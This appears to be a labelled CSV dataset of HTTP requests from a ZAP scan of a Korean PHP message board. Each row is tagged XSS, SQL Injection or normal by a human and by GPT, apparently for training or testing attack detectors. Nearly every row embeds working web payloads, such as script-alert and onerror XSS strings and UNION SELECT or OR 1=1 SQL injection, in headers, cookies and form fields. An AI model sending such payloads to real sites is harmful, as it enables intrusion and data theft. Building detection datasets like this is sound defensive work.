,id,combined_request,label_x,gpt_label
559,fb8584d7-8662-4117-9035-4a704843cb04,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=qa&device=pc&w=r&wr_id=3\r\ncontent-length: 973\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nuid=2023110315225029&w=r&bo_table=qa&wr_id=3&sca=&sfl=0W45pz4p&stx=&spt=&sst=&sod=&page=&wr_name=ZAP&wr_password=ZAP&wr_email=ZAP&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94...%ED%85%8C%EC%8A%A4%ED%8A%B8+%EC%A0%90%EA%B2%80+%EC%9E%85%EB%8B%88%EB%8B%A4.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%94%A8%ED%8B%B0%EC%95%84%EC%9D%B4%EB%9E%A9%0D%0A%3E+%0D%0A%3E+%EB%B3%B4%EC%95%88%EA%B8%B0%EC%88%A0%ED%8C%80%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%3Cscript%3E%0D%0A%3E+++++alert%28%27test%27%29%3B%0D%0A%3E+++++%2F%2F+%EA%B3%B5%EA%B2%A9%EC%9E%90%EB%8A%94+%EC%82%AC%EC%9A%A9%EC%9E%90%EC%9D%98+%EC%84%B8%EC%85%98+%EC%BF%A0%ED%82%A4%EB%A5%BC+%ED%83%88%EC%B7%A8%ED%95%98%EA%B1%B0%EB%82%98+%EB%8B%A4%EB%A5%B8+%EC%95%85%EC%9D%98%EC%A0%81%EC%9D%B8+%EC%9E%91%EC%97%85%EC%9D%84+%EC%88%98%ED%96%89%ED%95%A0+%EC%88%98+%EC%9E%88%EC%9D%8C%0D%0A%3E+%3C%2Fscript%3E%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",XSS,XSS
560,34424a7e-e830-45a1-9069-0415793b7d0a,"GET /bbs/_tail.sub.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: ' <scrIpt>alert(1);</scRipt>\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
561,2fc5e225-9bae-47f5-9077-469d87fced9a,"POST /bbs/board_list_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&page=1&sca&sfl&sfl=wr_content&sod=asc&sop=and&sst=wr_datetime&stx&stx=ZAP\r\ncontent-length: 112\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nbo_table=free&sfl=wr_content&stx=ZAP&spt=-7&sca=&sst=wr_datetime&sod=asc%27+AND+%271%27%3D%271&page=0W45pz4p&sw=",SQL Injection,SQL Injection
562,cf3dedce-85da-4298-9082-b91e208c5303,"POST /bbs/login_check.php HTTP/1.1\r\nhost:   src=http://badsite.com\r\nProxy-Connection: keep-alive\r\nContent-Length: 59\r\nCache-Control: max-age=0\r\nOrigin: http://211.115.206.18:7000\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://211.115.206.18:7000/\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27%29+UNION+ALL+select+NULL+--+; e1192aefb64683cc97abb83c71057733=cWE%3D; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-\r\nx-zap-scan-id: 40012\r\n\r\nurl=%252F&mb_id=%60+or+a%3Da+--&mb_password=%60+or+a%3Da+--",SQL Injection,SQL Injection
563,c5f8a8f4-6ff8-46ad-90d2-1d17f0e69531,"GET /bbs/ajax.autosavelist.php HTTP/1.1\r\nhost: ' <scrIpt>alert(1);</scRipt>\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27+UNION+ALL+select+NULL+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
564,24e318dc-479a-42d6-90fa-a53c094868f7,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=qa&device=pc&w=r&wr_id=3\r\ncontent-length: 1013\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nuid=2023110315225029&w=r&bo_table=qa&wr_id=3&sca=&sfl=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&stx=&spt=&sst=&sod=&page=&wr_name=ZAP&wr_password=ZAP&wr_email=ZAP&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94...%ED%85%8C%EC%8A%A4%ED%8A%B8+%EC%A0%90%EA%B2%80+%EC%9E%85%EB%8B%88%EB%8B%A4.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%94%A8%ED%8B%B0%EC%95%84%EC%9D%B4%EB%9E%A9%0D%0A%3E+%0D%0A%3E+%EB%B3%B4%EC%95%88%EA%B8%B0%EC%88%A0%ED%8C%80%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%0D%0A%3E+%3Cscript%3E%0D%0A%3E+++++alert%28%27test%27%29%3B%0D%0A%3E+++++%2F%2F+%EA%B3%B5%EA%B2%A9%EC%9E%90%EB%8A%94+%EC%82%AC%EC%9A%A9%EC%9E%90%EC%9D%98+%EC%84%B8%EC%85%98+%EC%BF%A0%ED%82%A4%EB%A5%BC+%ED%83%88%EC%B7%A8%ED%95%98%EA%B1%B0%EB%82%98+%EB%8B%A4%EB%A5%B8+%EC%95%85%EC%9D%98%EC%A0%81%EC%9D%B8+%EC%9E%91%EC%97%85%EC%9D%84+%EC%88%98%ED%96%89%ED%95%A0+%EC%88%98+%EC%9E%88%EC%9D%8C%0D%0A%3E+%3C%2Fscript%3E%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",XSS,XSS
565,1733d56c-e812-4851-9132-1f0e12bf4b97,GET /bbs/ajax.autosavedel.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: ' .<scrIpt>alert(1);</scRipt>\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27%29+UNION+ALL+select+NULL+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n,XSS,SQL Injection
566,11bc1bf2-34ee-49bf-917e-e615129a824d,"POST /bbs/new.php?device=%22+onMouseOver%3D%22alert%281%29%3B HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/new.php?device=pc\r\ncontent-length: 49\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\nsw=move&view=&sfl=&stx=&bo_table=&page=1&pressed=",XSS,XSS
567,97f84343-d647-45a5-9191-4b635ba6ab4a,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_datetime&w=r&wr_id=7\r\ncontent-length: 480\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=r&bo_table=free&wr_id=7&sca=&sfl=0W45pz4p&stx=&spt=%29+UNION+ALL+select+NULL+--+&sst=wr_datetime&sod=desc&page=1&wr_name=ZAP&wr_password=ZAP&wr_email=foo-bar%40example.com&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94..%EA%B0%80%EC%9D%84%EC%9E%85%EB%8B%88%EB%8B%A4.%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",SQL Injection,SQL Injection
568,592dd2f4-17c2-45be-91f5-7ae6aa9aef27,POST /bbs/delete.php?token=1698992570654491ba1d169 HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: ;\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_datetime&w=d&wr_id=4\r\ncontent-length: 116\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=d&bo_table=free&wr_id=4&comment_id=&sfl=&stx=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E&page=1&wr_password=ZAP,XSS,XSS
569,c6121297-8c40-48cd-9205-74df82427342,"POST /bbs/write_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/write.php?bo_table=free&page=1&sod=desc&sop=and&sst=wr_datetime&w=r&wr_id=7\r\ncontent-length: 480\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=r&bo_table=free&wr_id=7&sca=&sfl=&stx=0W45pz4p&spt=%29+UNION+ALL+select+NULL+--+&sst=wr_datetime&sod=desc&page=1&wr_name=ZAP&wr_password=ZAP&wr_email=foo-bar%40example.com&wr_homepage=ZAP&html=&wr_subject=Re%3A+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94.&wr_content=%0A%0A%0A+%3E+%0A+%3E+%0A+%3E+%EC%95%88%EB%85%95%ED%95%98%EC%84%B8%EC%9A%94..%EA%B0%80%EC%9D%84%EC%9E%85%EB%8B%88%EB%8B%A4.%0A+%3E+%0A+%3E+&wr_link1=ZAP&wr_link2=ZAP&bf_file%5B%5D=test_file.txt&captcha_key=ZAP",SQL Injection,SQL Injection
570,c949f823-8205-4ebb-920d-ce4f71b904bd,GET /bbs/ajax.autosaveload.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: ' .<scrIpt>alert(1);</scRipt>\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D+AND+1%3D2+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n,SQL Injection,XSS
571,138e4e2c-0cfa-4fb3-9239-92fcb507369a,"POST /bbs/ajax.filter.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nProxy-Connection: keep-alive\r\nContent-Length: 24\r\nAccept: 0W45pz4p\r\nDNT: 1\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nOrigin: http://211.115.206.18:7000\r\nReferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&wr_id=14\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27%29+UNION+ALL+select+NULL+--+; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nsubject=&content=1232131",SQL Injection,SQL Injection
572,f4e51663-d51d-4285-923c-db9a9c9d088a,"POST /bbs/password_lost2.php HTTP/1.1\r\nhost:  >.<scrIpt>alert(1);</scRipt>\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password_lost.php\r\ncontent-length: 28\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%27+AND+%271%27%3D%271%27+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\nmb_email=ZAP&captcha_key=ZAP",XSS,XSS
573,e9933824-b8f4-4347-9251-bcbef30afea1,"POST /bbs/write_comment_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nProxy-Connection: keep-alive\r\ncontent-length: 179\r\nCache-Control: max-age=0\r\nOrigin: http://211.115.206.18:7000\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&wr_id=14\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D+OR+1%3D1+--+\r\nx-zap-scan-id: 400token=bf37100ccabf723334f41a5832b10113&w=c&bo_table=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&wr_id=14&comment_id=&sca=&sfl=&stx=&spt=&page=&is_good=0&wr_content=1232131",XSS,SQL Injection
574,e111dedf-3f9c-4f88-925d-3c7c2ceda119,"POST /bbs/write_comment_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nProxy-Connection: keep-alive\r\ncontent-length: 140\r\nCache-Control: max-age=0\r\nOrigin: http://211.115.206.18:7000\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&wr_id=14\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D+OR+1%3D1+--+\r\nx-zap-scan-id: 400token=bf37100ccabf723334f41a5832b10113&w=c&bo_table=free&wr_id=14&comment_id=0W45pz4p&sca=&sfl=&stx=&spt=&page=&is_good=0&wr_content=1232131",SQL Injection,SQL Injection
575,f9225660-d812-44b3-9292-fc0e2c6d9d7d,"GET /bbs/_head.sub.php HTTP/1.1\r\nhost: ' <img src=x onerror=prompt()>\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
576,be8d9255-a3dc-4df3-9296-e6af0d75b3cd,"GET /bbs/?C=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/?C=D;O=A\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n",XSS,XSS
577,26468dd5-aeac-4259-92ba-597f68d87ea1,"POST /bbs/board_list_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&page=1&sca&sfl=wr_content&sod=asc&sop=and&sst=wr_datetime&stx=ZAP\r\ncontent-length: 86\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nbo_table=free&sfl=wr_content0W45pz4p&stx=ZAP&spt=-7&sst=wr_datetime&sod=asc&page=1&sw=",normal,SQL Injection
578,e6aefe8e-0682-4ffd-92cf-550be5ee0ae0,GET /bbs/_common.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: 0W45pz4p\r\npragma: no-cache\r\ncache-control: no-cache\r\nreferer: http://211.115.206.18:7000/bbs/\r\ncookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D%29+UNION+ALL+select+NULL+--+; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=cWE%3D\r\nx-zap-scan-id: 40012\r\n\r\n,SQL Injection,SQL Injection
579,bef2fcc6-b7a9-4d38-92de-025e441f7e33,"POST /bbs/new.php?device=%22+onMouseOver%3D%22alert%281%29%3B&gr_id=community&mb_id=ZAP&view=w HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/new.php?device=pc&gr_id=community&mb_id=ZAP&view=w\r\ncontent-length: 50\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nsw=move&view=w&sfl=&stx=&bo_table=&page=1&pressed=",XSS,XSS
580,fd41d1f1-23b5-4be5-9316-657048c261e3,"POST /bbs/delete_comment.php?token=1698992570654491ba135b0 HTTP/1.1\r\nhost:  ><img src=x onerror=prompt()>\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/password.php?bo_table=free&comment_id=12&page=1&sod=desc&sop=and&sst=wr_datetime&w=x\r\ncontent-length: 72\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=x&bo_table=free&wr_id=0&comment_id=12&sfl=&stx=&page=1&wr_password=%3B",SQL Injection,XSS
581,54a8dbfd-8c48-457e-9361-bbcc440f1a0d,"POST /bbs/write_comment_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nProxy-Connection: keep-alive\r\ncontent-length: 174\r\nCache-Control: max-age=0\r\nOrigin: http://211.115.206.18:7000\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nReferer: http://211.115.206.18:7000/bbs/board.php?bo_table=free&wr_id=14\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\ncookie: session=888528ee-2a6a-4ff0-af70-626b88bbabf2.R689nM5K2XUhRZY9KF21PDU5K4o; PHPSESSID=svf0hn53ffquep1qfna3un5gma; 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; ck_font_resize_rmv_class=; ck_font_resize_add_class=; io=AudecAd7mjzynVA7AAI-; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D+OR+1%3D1+--+\r\nx-zap-scan-id: 400token=bf37100ccabf723334f41a5832b10113&w=c&bo_table=%27%22%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E&wr_id=14&comment_id=&sca=&sfl=&stx=&spt=&page=&is_good=0&wr_content=1232131",XSS,XSS
582,fed04fdf-80b6-4845-93bf-c2721e5accdf,"POST /bbs/register_form_update.php HTTP/1.1\r\nhost: 211.115.206.18:7000\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\r\npragma: no-cache\r\ncache-control: no-cache\r\ncontent-type: application/x-www-form-urlencoded\r\nreferer: http://211.115.206.18:7000/bbs/register_form.php\r\ncontent-length: 317\r\nCookie: 2a0d2363701f23f8a75028924a3af643=MTAuMC4wLjI%3D; PHPSESSID=91l59l596kkdg5dogifkf3rcic; e1192aefb64683cc97abb83c71057733=ZnJlZQ%3D%3D\r\nx-zap-scan-id: 40012\r\n\r\nw=&url=https%3A%2F%2Fzap.example.com&agree=1&agree2=1&cert_type=&cert_no=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E&mb_sex=&mb_id=ZAP&mb_password=ZAP&mb_password_re=ZAP&mb_name=ZAP&mb_nick_default=&mb_nick=ZAP&old_email=&mb_email=foo-bar%40example.com&mb_mailling=1&mb_open=1&mb_open_default=&captcha_key=ZAP",XSS,XSS
